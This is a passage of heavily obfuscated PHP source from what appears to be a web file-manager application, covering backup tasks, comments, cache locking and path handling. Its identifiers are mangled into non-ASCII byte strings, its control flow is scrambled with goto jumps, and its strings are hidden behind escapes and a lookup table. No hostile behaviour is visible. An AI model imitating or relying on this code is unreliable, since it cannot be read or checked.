json_decode($cĞ—»øÀ¯º, !0); goto EêƒÅ¡¼¬; f¹¬æƒ’Ú•: } public function listData($aÎ’ã‹”ÆÙ = false, $eÓ‚ÃõÔæÊ = "\x6d\x6f\x64\x69\x66\171\124\x69\155\x65", $bë¿Ï´Äñ = false) { return parent::listData($aÎ’ã‹”ÆÙ, $eÓ‚ÃõÔæÊ, !0); } public function lastItem() { $cÓÆÏ¨£Å = $this->listData(); return !empty($cÓÆÏ¨£Å[0]) ? $cÓÆÏ¨£Å[0] : null; } public function kill($Dà„Ñ¯ ª‹) { goto aæÉ«áÛ·; eÊ«ì­Ö‹: $a×ÕÜŸˆ§… = $c´ùƒ—›„™[$DÂØóÉø¶ñ[28]]; $Dï²…ÚöîÕ = TEMP_FILES . $DÂØóÉø¶ñ[706] . $a×ÕÜŸˆ§… . $DÂØóÉø¶ñ[8]; IO::remove($Dï²…ÚöîÕ, !1); goto cÇãÜÍá·ç; D«‡÷—À: Task::kill($DÂØóÉø¶ñ[707]); Task::kill($DÂØóÉø¶ñ[725]); Task::kill($DÂØóÉø¶ñ[732]); goto eÊ«ì­Ö‹; cÇãÜÍá·ç: return $this->remove($Dà„Ñ¯ ª‹); goto e»’İÊ›¢Î; aæÉ«áÛ·: $DÂØóÉø¶ñ =& $_SERVER[Ìó]; $c´ùƒ—›„™ = $this->listData($Dà„Ñ¯ ª‹); if (!$c´ùƒ—›„™ || empty($c´ùƒ—›„™[$DÂØóÉø¶ñ[28]])) { return !0; } goto D«‡÷—À; e»’İÊ›¢Î: } public function remove($bÂİĞĞ×“) { $C¥¤¦®© = $this->listData($bÂİĞĞ×“); if (!$C¥¤¦®©) { return !0; } return $this->backupRemove($C¥¤¦®©); } private function backupRemove($aéÉæ‘íÇ) { $c•‚ŸÆ® =& $_SERVER[Ìó]; parent::remove($aéÉæ‘íÇ[$c•‚ŸÆ®[363]]); $A ¨«ó Åé = "\x7b\151\157\72{$aéÉæ‘íÇ[$c•‚ŸÆ®[687]]}\175\x2f\144\141\164\x61\x62\141\163\145\57\x62\x61\x63\153\x75\x70\137" . $aéÉæ‘íÇ[$c•‚ŸÆ®[28]]; IO::remove($A ¨«ó Åé, !1); return !0; } public function start() { goto dÊ¢ƒ¾†­¾; Fƒ…¢ç†­œ: if (!$e¬°ŒŒ¬”“->dbFile()) { return !1; } if ($F¢±Æ¬…ˆ´[$Aç¶¯‹•Ÿ[688]] == $Aç¶¯‹•Ÿ[463]) { $e¬°ŒŒ¬”“->file(); } Backup::set(array($Aç¶¯‹•Ÿ[685] => 1, $Aç¶¯‹•Ÿ[699] => time())); goto dï‡©½é¿‚; Añ³»ŸïÃ: if (!$F¢±Æ¬…ˆ´ || $F¢±Æ¬…ˆ´[$Aç¶¯‹•Ÿ[1381]] != $Aç¶¯‹•Ÿ[83]) { return !1; } $DœäÁõ§Øõ = $this->process(); foreach ($DœäÁõ§Øõ as $f‡ªãŠ÷¬) { if ($f‡ªãŠ÷¬) { return Task::restart($f‡ªãŠ÷¬[$Aç¶¯‹•Ÿ[363]]); } } goto dÂØ„ø·Œä; dÊ¢ƒ¾†­¾: $Aç¶¯‹•Ÿ =& $_SERVER[Ìó]; if ($GLOBALS[$Aç¶¯‹•Ÿ[6]][$Aç¶¯‹•Ÿ[84]][$Aç¶¯‹•Ÿ[2097]] != $Aç¶¯‹•Ÿ[83]) { return !0; } $F¢±Æ¬…ˆ´ = $this->config(); goto Añ³»ŸïÃ; dï‡©½é¿‚: return !0; goto b¹˜‘³ä¨ç; dÂØ„ø·Œä: $e¬°ŒŒ¬”“ = new Backup(); $e¬°ŒŒ¬”“->keep(); if (!$e¬°ŒŒ¬”“->db()) { return !1; } goto Fƒ…¢ç†­œ; b¹˜‘³ä¨ç: } public function process() { $b×‡¨ˆµ¯Û =& $_SERVER[Ìó]; return array($b×‡¨ˆµ¯Û[690] => Task::get($b×‡¨ˆµ¯Û[707]), $b×‡¨ˆµ¯Û[693] => Task::get($b×‡¨ˆµ¯Û[725]), $b×‡¨ˆµ¯Û[163] => Task::get($b×‡¨ˆµ¯Û[732])); } public function restore() { $cğ‰¤ËäŒ§ =& $_SERVER[Ìó]; ActionCall($cğ‰¤ËäŒ§[2098], !0, 1); ActionCall($cğ‰¤ËäŒ§[2098], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\141\x6d\145" => "\x63\x6f\155\155\x65\156\x74\x5f\x6d\x65\x74\141", "\155\145\x74\141\106\151\145\154\x64" => "\x63\157\x6d\155\x65\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($c»ãÓºæÄÊ) { $E´ö­·Ë‡ =& $_SERVER[Ìó]; if ($c»ãÓºæÄÊ[$E´ö­·Ë‡[2099]]) { $e«ãŸ§†Ê = $this->where(array($E´ö­·Ë‡[2100] => $c»ãÓºæÄÊ[$E´ö­·Ë‡[2099]]))->find(); if (!$e«ãŸ§†Ê || $e«ãŸ§†Ê[$E´ö­·Ë‡[367]] != $c»ãÓºæÄÊ[$E´ö­·Ë‡[367]] || $e«ãŸ§†Ê[$E´ö­·Ë‡[451]] != $c»ãÓºæÄÊ[$E´ö­·Ë‡[451]]) { return !1; } $this->where(array($E´ö­·Ë‡[2100] => $c»ãÓºæÄÊ[$E´ö­·Ë‡[2099]]))->setAdd($E´ö­·Ë‡[2101], 1); } return $this->add($c»ãÓºæÄÊ); } public function remove($fà½Å„Œù) { $b†¹¨Äâğç =& $_SERVER[Ìó]; $fÅ‚Ş×òÌ = array($b†¹¨Äâğç[2100] => $fà½Å„Œù); $F²·—èÅîÆ = $this->where($fÅ‚Ş×òÌ)->find(); if ($F²·—èÅîÆ[$b†¹¨Äâğç[2099]]) { $this->where(array($b†¹¨Äâğç[2100] => $F²·—èÅîÆ[$b†¹¨Äâğç[2099]]))->setAdd($b†¹¨Äâğç[2101], -1); } return $this->where($fÅ‚Ş×òÌ)->delete(); } public function edit($F¾Ğ³®›Á², $e«Û×¬·åò) { $EŠã‰´í‚ä =& $_SERVER[Ìó]; $FºÏ¨ ãïÇ = array($EŠã‰´í‚ä[2100] => $F¾Ğ³®›Á²); return $this->where($FºÏ¨ ãïÇ)->save(array($EŠã‰´í‚ä[2102] => $e«Û×¬·åò)); } public function prasise($E×ò‘ÚÛ›¨) { $aÙ¼›Å×ßó =& $_SERVER[Ìó]; $cÄ½•»¸á‹ = Model($aÙ¼›Å×ßó[2103]); $CîØ¯‚òò = array($aÙ¼›Å×ßó[2100] => $E×ò‘ÚÛ›¨, $aÙ¼›Å×ßó[1400] => USER_ID); $b‹­Ã­Ëèà = $cÄ½•»¸á‹->where($CîØ¯‚òò)->find(); if (!$b‹­Ã­Ëèà) { $cÄ½•»¸á‹->add($CîØ¯‚òò); $b«œ‰ÂÓ”ê = $this->where(array($aÙ¼›Å×ßó[2100] => $E×ò‘ÚÛ›¨))->setAdd($aÙ¼›Å×ßó[2104], 1); } else { $cÄ½•»¸á‹->where($CîØ¯‚òò)->delete(); $b«œ‰ÂÓ”ê = $this->where(array($aÙ¼›Å×ßó[2100] => $E×ò‘ÚÛ›¨))->setAdd($aÙ¼›Å×ßó[2104], -1); } return $b«œ‰ÂÓ”ê; } public function targetInfo($dÇ¦øÈê·‘, $Aæ÷„÷Íæ¾) { goto F”¥¦ñçë¹; dèòåÀï³ğ: return $F«³ÙÎŸƒ; goto D‚Šä¼†¼©; bˆ–ÉĞÚõ­: $FÁ½–Í³ = "\122\111\x47\110\x54\40\x4a\117\111\116\40{$this->tablePrefix}\x63\157\x6d\155\x65\x6e\164\x5f\160\162\141\151\163\145\x20\163\x74\141\x72\40\157\156\40\x63\x6f\155\155\145\156\164\56\x63\157\155\x6d\x65\156\x74\x49\104\x20\75\x20\x73\x74\141\x72\56\143\157\155\155\145\156\x74\111\x44"; $D´¶šÀÈáÛ = $this->alias($B¡Ö¶Ù¦¾[337])->where($C×ñŒ…‘•)->join($FÁ½–Í³, $B¡Ö¶Ù¦¾[2105])->count(); $F«³ÙÎŸƒ = array($B¡Ö¶Ù¦¾[2106] => $Dè›‹‹¬ç¥, $B¡Ö¶Ù¦¾[2107] => $D´¶šÀÈáÛ); goto dèòåÀï³ğ; F”¥¦ñçë¹: $B¡Ö¶Ù¦¾ =& $_SERVER[Ìó]; $C×ñŒ…‘• = array($B¡Ö¶Ù¦¾[516] => $dÇ¦øÈê·‘, $B¡Ö¶Ù¦¾[517] => $Aæ÷„÷Íæ¾); $Dè›‹‹¬ç¥ = $this->where($C×ñŒ…‘•)->count(); goto bˆ–ÉĞÚõ­; D‚Šä¼†¼©: } public function listData($bİŠÙä÷„) { $C°Š˜Ì˜‹Ò =& $_SERVER[Ìó]; if (isset($bİŠÙä÷„[$C°Š˜Ì˜‹Ò[2108]])) { if ($bİŠÙä÷„[$C°Š˜Ì˜‹Ò[2108]]) { $bİŠÙä÷„[$C°Š˜Ì˜‹Ò[2109]] = array($C°Š˜Ì˜‹Ò[926], intval($bİŠÙä÷„[$C°Š˜Ì˜‹Ò[2108]])); } unset($bİŠÙä÷„[$C°Š˜Ì˜‹Ò[2108]]); } if (isset($bİŠÙä÷„[$C°Š˜Ì˜‹Ò[2110]])) { if ($bİŠÙä÷„[$C°Š˜Ì˜‹Ò[2110]]) { $bİŠÙä÷„[$C°Š˜Ì˜‹Ò[2109]] = array($C°Š˜Ì˜‹Ò[923], intval($bİŠÙä÷„[$C°Š˜Ì˜‹Ò[2110]])); } unset($bİŠÙä÷„[$C°Š˜Ì˜‹Ò[2110]]); } return $this->_listData($bİŠÙä÷„); } private function _listData($EÍ©„—Ã¥ê) { $eÉÀõ™ˆŞÌ =& $_SERVER[Ìó]; $eíÇ»ËìÙ = $this->where($EÍ©„—Ã¥ê)->_makeOrder()->selectPage(100); $this->_listAppendParent($eíÇ»ËìÙ[$eÉÀõ™ˆŞÌ[350]]); $this->_listAppendUser($eíÇ»ËìÙ[$eÉÀõ™ˆŞÌ[350]]); $this->_listAppendMeta($eíÇ»ËìÙ[$eÉÀõ™ˆŞÌ[350]]); return $eíÇ»ËìÙ; } private function _makeOrder() { $fª•ˆª¬Û =& $_SERVER[Ìó]; $DŒà‹ÈÍ¼” = array($fª•ˆª¬Û[2104], $fª•ˆª¬Û[2101], $fª•ˆª¬Û[183]); $c­°ÉĞ„õ = Input::get($fª•ˆª¬Û[402], $fª•ˆª¬Û[7], $fª•ˆª¬Û[385], $DŒà‹ÈÍ¼”); $B²İîä´Ó = Input::get($fª•ˆª¬Û[403], $fª•ˆª¬Û[7], $fª•ˆª¬Û[1402], array($fª•ˆª¬Û[2111], $fª•ˆª¬Û[400])); $d‹½³‘ = $c­°ÉĞ„õ . $fª•ˆª¬Û[50] . $B²İîä´Ó; return $this->order($d‹½³‘); } private function _listAppendParent(&$Cğ®­ÑŸ¢›) { goto fğ­á³”; f†ŸÚ¿„Ò: if (!$cá®ß…¦°¼) { return; } $dÑóïÏŞ‡æ = $this->where(array($D÷Ç´¥±§[2100] => array($D÷Ç´¥±§[7], $cá®ß…¦°¼)))->select(); $dÑóïÏŞ‡æ = array_to_keyvalue($dÑóïÏŞ‡æ, $D÷Ç´¥±§[2109]); goto AÏ•âó™¿¬; AÏ•âó™¿¬: foreach ($Cğ®­ÑŸ¢› as &$eèÃ–‡°Ü¦) { if (isset($dÑóïÏŞ‡æ[$eèÃ–‡°Ü¦[$D÷Ç´¥±§[2099]]])) { $eèÃ–‡°Ü¦[$D÷Ç´¥±§[2112]] = $dÑóïÏŞ‡æ[$eèÃ–‡°Ü¦[$D÷Ç´¥±§[2099]]]; } } goto a³êº¦ÙŞ; fğ­á³”: $D÷Ç´¥±§ =& $_SERVER[Ìó]; $cá®ß…¦°¼ = array_unique(array_to_keyvalue($Cğ®­ÑŸ¢›, $D÷Ç´¥±§[33], $D÷Ç´¥±§[2099])); $cá®ß…¦°¼ = array_remove_value($cá®ß…¦°¼, $D÷Ç´¥±§[463]); goto f†ŸÚ¿„Ò; a³êº¦ÙŞ: } private function _listAppendUser(&$Dé±ÅÅÈ‘ö) { goto dÎí›¤¹±’; a²ÉÈŒ»³: foreach ($Dé±ÅÅÈ‘ö as &$C‹©ï‡­©ä) { $C‹©ï‡­©ä[$cø™ÔÊŠº«[530]] = $CÚ‚Ü‘›¹[$C‹©ï‡­©ä[$cø™ÔÊŠº«[1409]]]; if (isset($C‹©ï‡­©ä[$cø™ÔÊŠº«[2112]])) { $C‹©ï‡­©ä[$cø™ÔÊŠº«[2112]][$cø™ÔÊŠº«[530]] = $CÚ‚Ü‘›¹[$C‹©ï‡­©ä[$cø™ÔÊŠº«[2112]][$cø™ÔÊŠº«[1409]]]; } } goto cø†àá™ê; c’áÃËˆ´š: if (count($eÚ’ŸßôÖà) == 0) { return; } foreach ($Dé±ÅÅÈ‘ö as $C‹©ï‡­©ä) { if (isset($C‹©ï‡­©ä[$cø™ÔÊŠº«[2112]])) { $eÚ’ŸßôÖà[] = $C‹©ï‡­©ä[$cø™ÔÊŠº«[2112]][$cø™ÔÊŠº«[1409]]; } } $CÚ‚Ü‘›¹ = Model($cø™ÔÊŠº«[472])->userListInfo($eÚ’ŸßôÖà); goto a²ÉÈŒ»³; dÎí›¤¹±’: $cø™ÔÊŠº« =& $_SERVER[Ìó]; $eÚ’ŸßôÖà = array_unique(array_to_keyvalue($Dé±ÅÅÈ‘ö, $cø™ÔÊŠº«[33], $cø™ÔÊŠº«[1409])); $eÚ’ŸßôÖà = array_remove_value($eÚ’ŸßôÖà, $cø™ÔÊŠº«[463]); goto c’áÃËˆ´š; cø†àá™ê: } private function _listAppendMeta(&$f¦»â‘’øà) { goto cÙä´Ú•è²; cÙä´Ú•è²: $EŸ êµ›İî =& $_SERVER[Ìó]; $fá›©ï–„± = array_unique(array_to_keyvalue($f¦»â‘’øà, $EŸ êµ›İî[33], $EŸ êµ›İî[2109])); $fá›©ï–„± = array_remove_value($fá›©ï–„±, $EŸ êµ›İî[463]); goto E‘²‘‹»Á; B¦·µìĞã: if (!$eùê†¢‚––) { return !1; } foreach ($f¦»â‘’øà as &$AóÒì¹ğåô) { $AóÒì¹ğåô[$EŸ êµ›İî[412]] = $eùê†¢‚––[$AóÒì¹ğåô[$EŸ êµ›İî[2109]]]; if (isset($AóÒì¹ğåô[$EŸ êµ›İî[2112]])) { $AóÒì¹ğåô[$EŸ êµ›İî[2112]][$EŸ êµ›İî[412]] = $eùê†¢‚––[$AóÒì¹ğåô[$EŸ êµ›İî[2112]][$EŸ êµ›İî[2109]]]; } } goto f‡¸œ—ï¼Ã; E‘²‘‹»Á: if (!$fá›©ï–„±) { return; } foreach ($f¦»â‘’øà as $AóÒì¹ğåô) { if (isset($AóÒì¹ğåô[$EŸ êµ›İî[2112]])) { $fá›©ï–„±[] = $AóÒì¹ğåô[$EŸ êµ›İî[2112]][$EŸ êµ›İî[2109]]; } } $eùê†¢‚–– = $this->metaList($fá›©ï–„±); goto B¦·µìĞã; f‡¸œ—ï¼Ã: } private function metaList($BÂ¥ªŞÍğ) { goto d³˜àêÜ›; c‚ÅšÓáÃŒ: return $E†‘¨Ú·õ ? $E†‘¨Ú·õ : array(); goto dìÇæ³—Ä•; d³˜àêÜ›: $A­çØ¨‘Ç· =& $_SERVER[Ìó]; if (!$BÂ¥ªŞÍğ) { return array(); } $e¡Ø‘ªõÅ = array($A­çØ¨‘Ç·[2109] => array($A­çØ¨‘Ç·[7], $BÂ¥ªŞÍğ)); goto a‰Ïù£¦½‹; a‰Ïù£¦½‹: $E†‘¨Ú·õ = Model($A­çØ¨‘Ç·[2113])->where($e¡Ø‘ªõÅ)->select(); $E†‘¨Ú·õ = array_to_keyvalue_group($E†‘¨Ú·õ, $A­çØ¨‘Ç·[2109]); foreach ($E†‘¨Ú·õ as $dˆê¬‰´’ => $a‡…Ÿ‹ŠÇ—) { $Có¡•Ç•× = array(); foreach ($a‡…Ÿ‹ŠÇ— as $Aºùèò½†„) { $Có¡•Ç•×[$Aºùèò½†„[$A­çØ¨‘Ç·[89]]] = $Aºùèò½†„[$A­çØ¨‘Ç·[355]]; } $E†‘¨Ú·õ[$dˆê¬‰´’] = $Có¡•Ç•×; } goto c‚ÅšÓáÃŒ; dìÇæ³—Ä•: } } goto Bç«ù©Õ°; FÔØˆ†ÄÜ£: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $eÏ¥ˆÄ½â¿ =& $_SERVER[Ìó]; $EÈ²“»ÁŠ¼ = $GLOBALS[$eÏ¥ˆÄ½â¿[6]][$eÏ¥ˆÄ½â¿[333]]; self::$cachePath = $EÈ²“»ÁŠ¼[$eÏ¥ˆÄ½â¿[163]][$eÏ¥ˆÄ½â¿[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($d÷œï»„¼®, $a¤»ßŸÊŸá = 0) { goto C‘ùğí•–Š; Eãƒƒí¦: $this->unlock($d÷œï»„¼®); return !1; goto bÛ†‹Ñ’¸…; aê«“ÎŠèî: $D»³äŸ¨±‰ = rtrim(self::$cachePath, $b¼¥ö­’ä[8]) . $b¼¥ö­’ä[776] . md5($d÷œï»„¼®) . $b¼¥ö­’ä[777]; if (file_exists($D»³äŸ¨±‰) && filemtime($D»³äŸ¨±‰) && filemtime($D»³äŸ¨±‰) < time() - 10) { @unlink($D»³äŸ¨±‰); } do { if (file_exists($D»³äŸ¨±‰)) { cacheLockWait(); continue; } $AŒ¸Ä·â = fopen($D»³äŸ¨±‰, $b¼¥ö­’ä[778]); if (!$AŒ¸Ä·â) { return !1; } $e…›°î‹¢‘ = flock($AŒ¸Ä·â, LOCK_EX | LOCK_NB); self::$caches[$d÷œï»„¼®] = array($b¼¥ö­’ä[779] => $AŒ¸Ä·â, $b¼¥ö­’ä[163] => $D»³äŸ¨±‰); fwrite($AŒ¸Ä·â, $A»ß‰Ö“ˆ); clearstatcache(); if ($AŒ¸Ä·â && $e…›°î‹¢‘) { return !0; } cacheLockWait(); } while (microtime(!0) < $A»ß‰Ö“ˆ); goto Eãƒƒí¦; C‘ùğí•–Š: $b¼¥ö­’ä =& $_SERVER[Ìó]; $BöÌÒğ–¤ = microtime(!0); $A»ß‰Ö“ˆ = $BöÌÒğ–¤ + $a¤»ßŸÊŸá + 0.0001; goto aê«“ÎŠèî; bÛ†‹Ñ’¸…: } public function lockGet($FÎÙøÔ¤æ³) { $A‘øŒêê„ˆ =& $_SERVER[Ìó]; $f—ß«Œï¤Ç = rtrim(self::$cachePath, $A‘øŒêê„ˆ[8]) . $A‘øŒêê„ˆ[776] . md5($FÎÙøÔ¤æ³) . $A‘øŒêê„ˆ[777]; return file_exists($f—ß«Œï¤Ç); } public function unlock($e¬è®ƒƒïä) { goto aÑµºİÕÜ; c®„‚Òæ„ê: unset(self::$caches[$e¬è®ƒƒïä]); goto AñãªÕ«ø; aÑµºİÕÜ: $B§åô¼²¡ =& $_SERVER[Ìó]; $f¢”Æ®”ãÒ = self::$caches[$e¬è®ƒƒïä]; if (!$f¢”Æ®”ãÒ) { return; } goto Eõó½ĞÊÆç; Eõó½ĞÊÆç: @flock($f¢”Æ®”ãÒ[$B§åô¼²¡[779]], LOCK_UN); @fclose($f¢”Æ®”ãÒ[$B§åô¼²¡[779]]); @unlink($f¢”Æ®”ãÒ[$B§åô¼²¡[163]]); goto c®„‚Òæ„ê; AñãªÕ«ø: } } class CacheLockRedis { public function lock($c™ó‹¬¦®è, $Fàˆ¶È…Áœ = 10) { $C·ª½ø§ÚÄ = Cache::init(); $cïš¹î½ï© = microtime(!0) + $Fàˆ¶È…Áœ; while (microtime(!0) < $cïš¹î½ï©) { $B™½¨›ƒœ¯ = $C·ª½ø§ÚÄ->get($c™ó‹¬¦®è); if (!$B™½¨›ƒœ¯) { $FˆëŞ®¬„ = $C·ª½ø§ÚÄ->setLock($c™ó‹¬¦®è, $cïš¹î½ï©, $Fàˆ¶È…Áœ); if ($FˆëŞ®¬„) { return !0; } } else { if ($B™½¨›ƒœ¯ < microtime(!0)) { $C·ª½ø§ÚÄ->set($c™ó‹¬¦®è, $cïš¹î½ï©, $cïš¹î½ï©); if ($C·ª½ø§ÚÄ->get($c™ó‹¬¦®è) === $B™½¨›ƒœ¯) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Aê‚Ñ‹Š¿¦) { return Cache::init()->get($Aê‚Ñ‹Š¿¦); } public function unlock($D’¶–äŞ) { return Cache::init()->remove($D’¶–äŞ); } } class CacheLockMemcached { public function lock($Fí¶¨¯•ß, $Dàµ¶ÃÒĞã = 0) { $b¬«ÒË¯Ü¢ = Cache::init(); $Bİš­ØÅŸ´ = microtime(!0) + $Dàµ¶ÃÒĞã; while (microtime(!0) < $Bİš­ØÅŸ´) { $CÅÓáá¼°Œ = $b¬«ÒË¯Ü¢->get($Fí¶¨¯•ß); if (!$CÅÓáá¼°Œ || $CÅÓáá¼°Œ < microtime(!0)) { $e’³¡¬¡ÊÃ = $b¬«ÒË¯Ü¢->handle->add($Fí¶¨¯•ß, $Bİš­ØÅŸ´, $Dàµ¶ÃÒĞã); if ($e’³¡¬¡ÊÃ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($E•ç™ÖÃ²¯) { return Cache::init()->get($E•ç™ÖÃ²¯); } public function unlock($B¸È±ñŸ Ë) { return Cache::init()->remove($B¸È±ñŸ Ë); } } goto bøÚÉ¢â‹; f®ê×ÚáŠ¹: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $D®ÑÃ†ºé¦ =& $_SERVER[Ìó]; $this->objectDriver = array($D®ÑÃ†ºé¦[57], $D®ÑÃ†ºé¦[58], $D®ÑÃ†ºé¦[59], $D®ÑÃ†ºé¦[60], $D®ÑÃ†ºé¦[61], $D®ÑÃ†ºé¦[62], $D®ÑÃ†ºé¦[63], $D®ÑÃ†ºé¦[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($d«„¸Ìóæ–) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($d«„¸Ìóæ–, $_SERVER[Ìó][8]); } return $d«„¸Ìóæ–; } public function getPathName($bºãÉ†ÒÀ) { return $bºãÉ†ÒÀ; } public function iconvApp($B…”ß©İ£) { return $B…”ß©İ£; } public function iconvSystem($bå£½¥¯†‘) { return $bå£½¥¯†‘; } public function iconvTo($D‰ğÀÉ”», $FÁù°³Æ½«, $a¤í†ù˜ù) { goto aíŠÙÜ”ö; A›µìŸ­®è: $dÖŒÒ®Ú¹[$a¤í†ù˜ù . $FİÕŒàíœƒ[66] . $FÁù°³Æ½« . $FİÕŒàíœƒ[67] . $D‰ğÀÉ”»] = $D‰ğÀÉ”»; $dÖŒÒ®Ú¹[$a¤í†ù˜ù . $FİÕŒàíœƒ[66] . $FÁù°³Æ½« . $FİÕŒàíœƒ[67] . $EÓĞ±Õ’] = $D‰ğÀÉ”»; $dÖŒÒ®Ú¹[$FÁù°³Æ½« . $FİÕŒàíœƒ[66] . $a¤í†ù˜ù . $FİÕŒàíœƒ[67] . $EÓĞ±Õ’] = $EÓĞ±Õ’; goto Céœ²¬Ÿğ¼; aíŠÙÜ”ö: $FİÕŒàíœƒ =& $_SERVER[Ìó]; if (!$D‰ğÀÉ”» || !function_exists($FİÕŒàíœƒ[65])) { return $D‰ğÀÉ”»; } static $dÖŒÒ®Ú¹ = array(); goto e±ªè‰¶À¥; e±ªè‰¶À¥: $fÀÇò©Ã’¡ = $FÁù°³Æ½« . $FİÕŒàíœƒ[66] . $a¤í†ù˜ù . $FİÕŒàíœƒ[67] . $D‰ğÀÉ”»; if (isset($dÖŒÒ®Ú¹[$fÀÇò©Ã’¡])) { return $dÖŒÒ®Ú¹[$fÀÇò©Ã’¡]; } if (function_exists($FİÕŒàíœƒ[68])) { $EÓĞ±Õ’ = @mb_convert_encoding($D‰ğÀÉ”», $a¤í†ù˜ù, $FÁù°³Æ½«); } else { $EÓĞ±Õ’ = @iconv($FÁù°³Æ½«, $a¤í†ù˜ù, $D‰ğÀÉ”»); } goto aÂÜÀ¯È¼•; Céœ²¬Ÿğ¼: return $EÓĞ±Õ’; goto EÀ”ñÊ; aÂÜÀ¯È¼•: $EÓĞ±Õ’ = $EÓĞ±Õ’ ? $EÓĞ±Õ’ : $D‰ğÀÉ”»; if (strstr($EÓĞ±Õ’, $FİÕŒàíœƒ[69])) { $EÓĞ±Õ’ = str_replace($FİÕŒàíœƒ[69], $FİÕŒàíœƒ[70], $EÓĞ±Õ’); } $dÖŒÒ®Ú¹[$FÁù°³Æ½« . $FİÕŒàíœƒ[66] . $a¤í†ù˜ù . $FİÕŒàíœƒ[67] . $D‰ğÀÉ”»] = $EÓĞ±Õ’; goto A›µìŸ­®è; EÀ”ñÊ: } public function getPathInner($DËáïœ‡–) { $DÍ¸ÓŒ’Â´ = IO::init($DËáïœ‡–); return $DÍ¸ÓŒ’Â´->path; } public function getPathOuter($F×Êöä¦ò) { $B½µ‘ÚãŒ =& $_SERVER[Ìó]; $Fˆµã ê§‰ = strlen(trim($this->pathBase, $B½µ‘ÚãŒ[8])); $F×Êöä¦ò = substr(trim($F×Êöä¦ò, $B½µ‘ÚãŒ[8]), $Fˆµã ê§‰); return $this->pathDriver . $B½µ‘ÚãŒ[8] . ltrim($F×Êöä¦ò, $B½µ‘ÚãŒ[8]); } public function isParentOf($Bô Âõ‰, $AŠ©„³ŒĞ) { $dâæÜ‹®Ë¾ =& $_SERVER[Ìó]; $Bô Âõ‰ = rtrim(strtolower($Bô Âõ‰), $dâæÜ‹®Ë¾[8]) . $dâæÜ‹®Ë¾[8]; $AŠ©„³ŒĞ = rtrim(strtolower($AŠ©„³ŒĞ), $dâæÜ‹®Ë¾[8]) . $dâæÜ‹®Ë¾[8]; $B¸‘äÄëİ» = strpos($AŠ©„³ŒĞ, $Bô Âõ‰) === 0; return $B¸‘äÄëİ»; } public function getType() { $dÕ·½±ÀË =& $_SERVER[Ìó]; $f·©‚×›Ç” = str_replace($dÕ·½±ÀË[71], $dÕ·½±ÀË[33], get_class($this)); return strtolower($f·©‚×›Ç”); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($dÈ‡´•ÂÒ‚, $bÌ¬ö¿ª’é) { $a‰Â¼ˆ½¶ë =& $_SERVER[Ìó]; $Fš™Ò¢’Ü = rtrim($dÈ‡´•ÂÒ‚, $a‰Â¼ˆ½¶ë[8]) . $a‰Â¼ˆ½¶ë[8] . $bÌ¬ö¿ª’é; $eŸÉ ÛÑ = $this->exist($Fš™Ò¢’Ü); return $eŸÉ ÛÑ ? $Fš™Ò¢’Ü : !1; } public function renameObject($fßô¡Ù©ë, $DĞ—§èéĞ) { goto dë…óŠÓ¬ƒ; dë…óŠÓ¬ƒ: $DñªØç†éæ =& $_SERVER[Ìó]; $C–Óø¦ŒŠÕ = $DĞ—§èéĞ; Hook::trigger($DñªØç†éæ[72], $this, $fßô¡Ù©ë, $this, $this->pathFather($fßô¡Ù©ë) . $DĞ—§èéĞ); goto a§Ë£‡Å‹·; a§Ë£‡Å‹·: $fßô¡Ù©ë = $this->getPathOuter($fßô¡Ù©ë); $DĞ—§èéĞ = $this->pathFather($fßô¡Ù©ë) . $DĞ—§èéĞ; if (IO::isFile($fßô¡Ù©ë)) { $Dì¸òòÕÃ– = IO::copy($fßô¡Ù©ë, $this->pathFather($fßô¡Ù©ë), REPEAT_RENAME_FOLDER, $C–Óø¦ŒŠÕ); if ($Dì¸òòÕÃ–) { IO::remove($fßô¡Ù©ë); } } else { $Dì¸òòÕÃ– = IO::mkdir($DĞ—§èéĞ); if (!$Dì¸òòÕÃ–) { return !1; } $b¶Ö©öÕ¾ = IO::listPath($fßô¡Ù©ë, !0); $eƒÈ‹Í†ÖÌ = array_merge($b¶Ö©öÕ¾[$DñªØç†éæ[73]], $b¶Ö©öÕ¾[$DñªØç†éæ[74]]); foreach ($eƒÈ‹Í†ÖÌ as $D‚ß·ë¶Ù¥) { IO::move($D‚ß·ë¶Ù¥[$DñªØç†éæ[75]], $DĞ—§èéĞ, REPEAT_RENAME_FOLDER); } IO::remove($fßô¡Ù©ë); } goto dŒçôùŒĞˆ; dŒçôùŒĞˆ: return $Dì¸òòÕÃ– ? $DĞ—§èéĞ : !1; goto B…ØÍïİÅ; B…ØÍïİÅ: } public function tempFile($E…ó‹æ¡ = '', $C’°é¥ö¨ = '') { goto FøÇé§èğ—; EÜŠ°‹ò—İ: $cÌĞÆèğ¹É = $B‰¢»°Ë‹É . $E…ó‹æ¡; @touch($cÌĞÆèğ¹É); if ($C’°é¥ö¨) { file_put_contents($cÌĞÆèğ¹É, $C’°é¥ö¨); } goto A¿“¹„Å‡æ; FøÇé§èğ—: if (!$E…ó‹æ¡) { $E…ó‹æ¡ = rand_string(15); } $B‰¢»°Ë‹É = TEMP_FILES . rand_string(15) . $_SERVER[Ìó][8]; @mkdir($B‰¢»°Ë‹É, 511, !0); goto EÜŠ°‹ò—İ; A¿“¹„Å‡æ: return $cÌĞÆèğ¹É; goto DÇ†åÚÒŠó; DÇ†åÚÒŠó: } public function tempFileRemve($BŒÄ¡«ƒ·) { @unlink($BŒÄ¡«ƒ·); @rmdir($this->pathFather($BŒÄ¡«ƒ·)); } public function mkfile($c®ÙÚ‡ÙÑ›, $Dáİ‰æª‹Ñ = '', $A‘ã›£İó· = REPEAT_RENAME) { } public function mkdir($b”Š±Ø¶Ù, $F 